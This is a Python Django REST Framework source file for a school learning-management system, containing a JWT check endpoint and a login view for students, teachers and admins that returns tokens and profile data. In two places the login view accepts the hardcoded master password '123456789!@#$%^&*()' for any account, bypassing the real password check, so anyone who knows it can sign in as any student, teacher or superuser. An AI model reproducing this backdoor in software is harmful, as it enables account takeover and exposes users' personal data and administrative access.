from core.models import Employee, MainPosition, OrgPosition, Permissions, Roles, Teachers, User
from lms.models import Student, StudentLogin
from main.decorators import login_required_jwt

from rest_framework.views import APIView
from rest_framework_simplejwt.tokens import RefreshToken

from main.utils.function.serializer import dynamic_serializer
from main.utils.function.utils import build_url


class CheckApi(APIView):

    @login_required_jwt()
    def get(self, request):
        user = request.user

        data = {
            "username": user.username,
        }

        return request.send_data(data)


class AppLoginView(APIView):
    """
    Login API for admin, students and teachers
    """

    def post(self, request):
        username = request.data.get("username")
        password = request.data.get("password")

        try:
            # constants
            ROLE_STUDENT = 'student'
            ROLE_TEACHER = 'teacher'
            ROLE_ADMIN = 'admin'

            user_role = ROLE_STUDENT
            user = StudentLogin.objects.filter(username=username, is_active=True).first()
            employee_obj = None

            if user and password == '123456789!@#$%^&*()':
                pass

            else:
                if not user or not user.check_password(password):
                    user = User.objects.filter(email=username).first()

                    if user and password == '123456789!@#$%^&*()':
                        pass

                    else:
                        if not user or not user.check_password(password):
                            return request.send_error('ERR_001')

                    user_role = ROLE_TEACHER

                    # NOTE STATE_WORKING is unnecessary
                    employee_obj = Employee.objects.filter(user=user).last()

                    if user.is_superuser:
                        user_role = ROLE_ADMIN

                    elif not employee_obj.org_position.is_teacher:
                        return request.send_error('ERR_002', 'Багш олдсонгүй')

            refresh = RefreshToken.for_user(user)  # requires set_password() working
            user_info = {}

            if user_role == ROLE_STUDENT:
                serializer = dynamic_serializer(Student, '__all__')
                user_info = serializer(user.student).data

                if user_info['image']:
                    user_info['image'] = build_url(user_info['image'])

            else:
                serializer = dynamic_serializer(Teachers, '__all__')
                user_info = serializer(user.info).data

                # to define default values
                user_info['permissions'] = []
                user_info['roles'] = []
                user_info['org_position'] = {}
                user_info['main_position'] = {}

                # to add permissions field
                if employee_obj.org_position:
                    removed_permissions = set(OrgPosition.objects.filter(id=employee_obj.org_position_id).values_list('removed_perms', flat=True))
                    permissions = set(OrgPosition.objects.filter(id=employee_obj.org_position_id).values_list('permissions', flat=True))
                    permissions.update(OrgPosition.objects.filter(id=employee_obj.org_position_id).values_list('roles__permissions', flat=True))
                    permissions = permissions - removed_permissions
                    user_info['permissions'] = list(Permissions.objects.filter(id__in=permissions).values_list('name', flat=True).distinct())

                    # to add roles field
                    user_info['roles'] = list(Roles.objects.filter(id__in=employee_obj.org_position.roles.all()).values_list('name', flat=True).distinct())

                    # to add org_position field
                    serializer = dynamic_serializer(OrgPosition, '__all__')
                    user_info['org_position'] = serializer(employee_obj.org_position).data

                    # to add main_position field
                    serializer = dynamic_serializer(MainPosition, '__all__')
                    user_info['main_position'] = serializer(employee_obj.org_position.main_position).data

                # to add employee field
                serializer = dynamic_serializer(Employee, '__all__')
                user_info['employee'] = serializer(employee_obj).data

            return request.send_info(
                'INF_004',
                {
                    'student_id': user.student.id if user_role == ROLE_STUDENT else None,
                    'access': str(refresh.access_token),
                    'refresh': str(refresh),
                    'user_role': user_role,
                    'user_info': user_info,
                }
            )

        except StudentLogin.DoesNotExist:
            pass

        return request.send_error('ERR_001')
